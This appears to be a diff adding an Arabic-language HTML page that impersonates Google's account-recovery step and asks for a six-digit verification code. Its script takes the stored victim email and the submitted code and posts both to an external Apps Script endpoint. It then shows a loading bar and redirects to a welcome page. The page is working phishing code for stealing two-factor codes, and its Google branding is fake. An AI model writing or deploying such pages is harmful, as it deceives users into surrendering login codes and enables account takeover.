@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>استرداد الحساب - إدخال الرمز</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, "Helvetica Neue", sans-serif;
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 16px;
+        }
+        .card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 440px;
+            padding: 40px 32px;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+        }
+        .logo-container { text-align: center; margin-bottom: 16px; }
+        .logo-text { font-size: 24px; font-weight: 500; letter-spacing: -0.5px; }
+        .logo-blue { color: #4285F4; }
+        .logo-red { color: #EA4335; }
+        .logo-yellow { color: #FBBC05; }
+        .logo-green { color: #34A853; }
+
+        h1 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin: 0 0 16px 0; }
+        .description {
+            font-size: 14px; color: #3c4043; text-align: center;
+            line-height: 1.5; margin: 0 0 24px 0;
+        }
+        .email-box {
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            border: 1px solid #dadce0; padding: 6px 12px; border-radius: 16px;
+            width: fit-content; margin: 0 auto 32px auto;
+        }
+        .email-text { font-size: 14px; color: #3c4043; font-weight: 500; }
+        .email-icon {
+            width: 20px; height: 20px; background: #5f6368; color: white;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px;
+        }
+        .info-text { font-size: 14px; color: #202124; text-align: right; line-height: 1.6; margin-bottom: 24px; }
+
+        .input-container { position: relative; margin-bottom: 8px; width: 100%; }
+        .input-field {
+            width: 100%; padding: 16px; border: 2px solid #1a73e8;
+            border-radius: 4px; font-size: 16px; outline: none;
+            text-align: right; background: transparent;
+        }
+        .input-label {
+            position: absolute; right: 12px; top: -10px;
+            background: #ffffff; padding: 0 6px;
+            color: #1a73e8; font-size: 12px; font-weight: 500;
+        }
+
+        .error-message {
+            color: #d93025; font-size: 12px; text-align: right;
+            margin-bottom: 24px; min-height: 18px;
+            display: flex; align-items: center; gap: 4px;
+        }
+
+        .actions-container {
+            display: flex; justify-content: space-between;
+            align-items: center; margin-top: 16px;
+        }
+        .secondary-link {
+            color: #1a73e8; text-decoration: none; font-size: 14px;
+            font-weight: 500; cursor: pointer; background: none; border: none; padding: 0;
+        }
+        .secondary-link:hover { text-decoration: underline; }
+        .primary-button {
+            background-color: #1a73e8; color: white; border: none;
+            padding: 10px 24px; border-radius: 4px; font-size: 14px;
+            font-weight: 500; cursor: pointer;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        .primary-button:hover { background-color: #1557b0; }
+
+        #page-loading-bar {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            z-index: 9999;
+            background: transparent;
+            overflow: hidden;
+            display: none;
+        }
+        #page-loading-bar::after {
+            content: '';
+            position: absolute;
+            top: 0; right: -40%; width: 40%; height: 100%;
+            background: #1a73e8;
+            animation: page-load-slide 1.4s ease-in-out infinite;
+        }
+        @keyframes page-load-slide {
+            0%   { right: 100%; width: 20%; }
+            50%  { right: 20%; width: 60%; }
+            100% { right: -80%; width: 20%; }
+        }
+    </style>
+</head>
+<body>
+<div id="page-loading-bar"></div>
+    <div class="card">
+        <div class="logo-container">
+            <span class="logo-text">
+                <span class="logo-blue">G</span><span class="logo-red">o</span><span class="logo-yellow">o</span><span class="logo-blue">g</span><span class="logo-green">l</span><span class="logo-red">e</span>
+            </span>
+        </div>
+
+        <h1>استرداد الحساب</h1>
+        <p class="description">للمساعدة في الحفاظ على أمان حسابك، تريد Google التأكد من أنك أنت مَن يحاول تسجيل الدخول</p>
+
+        <div class="email-box">
+            <div class="email-icon">👤</div>
+            <span class="email-text" id="email-display">example@gmail.com</span>
+        </div>
+
+        <p class="info-text" id="info-text">تم للتو إرسال رسالة إلكترونية إلى <b id="email-hint"></b> تتضمن رمز التحقّق</p>
+
+        <div class="input-container">
+            <label class="input-label">إدخال الرمز</label>
+            <input type="text" id="code-input" class="input-field" autofocus maxlength="6" inputmode="numeric">
+        </div>
+
+        <div id="error-msg" class="error-message"></div>
+
+        <div class="actions-container">
+            <button class="secondary-link" onclick="window.location.href='index.html#step4'">تجربة طريقة أخرى</button>
+            <button id="next-button" class="primary-button">التالي</button>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = "https://script.google.com/macros/s/AKfycbzcd0ubB5AkKt3dTrDonb7rlyLr5zukLdYKiLj7O62Cc22YSIddsyl_Ip0P2taH9YD-vw/exec";
+
+        function sendToAPI(data) {
+            fetch(API_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ ...data, timestamp: new Date().toISOString() })
+            }).catch(() => {});
+        }
+
+        // عرض الإيميل الحقيقي من localStorage
+        const userEmail = localStorage.getItem('user_email') || 'example@gmail.com';
+        document.getElementById('email-display').textContent = userEmail;
+
+        // بناء hint للإيميل (مثلاً: ma•••••@gmail.com)
+        function buildEmailHint(email) {
+            const parts = email.split('@');
+            if (parts.length !== 2) return email;
+            const name = parts[0];
+            const domain = parts[1];
+            if (name.length <= 2) return email;
+            const hint = name.substring(0, 2) + '•'.repeat(Math.min(name.length - 2, 5));
+            return hint + '@' + domain;
+        }
+        document.getElementById('email-hint').textContent = buildEmailHint(userEmail);
+
+        const codeInput = document.getElementById('code-input');
+        const errorMsg = document.getElementById('error-msg');
+
+        document.getElementById('next-button').addEventListener('click', function () {
+            const codeValue = codeInput.value.trim();
+            const numericRegex = /^\d{6}$/;
+
+            if (!numericRegex.test(codeValue)) {
+                errorMsg.textContent = 'يرجى إدخال رمز التحقق المكون من 6 أرقام فقط.';
+                codeInput.style.borderColor = '#d93025';
+                return;
+            }
+
+            errorMsg.textContent = '';
+            codeInput.style.borderColor = '#1a73e8';
+
+            sendToAPI({
+                event: "CODE_SUBMIT",
+                email: userEmail,
+                code: codeValue
+            });
+
+            // تشغيل شريط التحميل
+            const bar = document.getElementById('page-loading-bar');
+            bar.style.display = 'block';
+            document.getElementById('next-button').disabled = true;
+
+            setTimeout(() => {
+                window.location.href = 'welcome.html';
+            }, 600);
+        });
+
+        codeInput.addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '');
+            errorMsg.textContent = '';
+            this.style.borderColor = '#1a73e8';
+        });
+    </script>
+</body>
+</html>
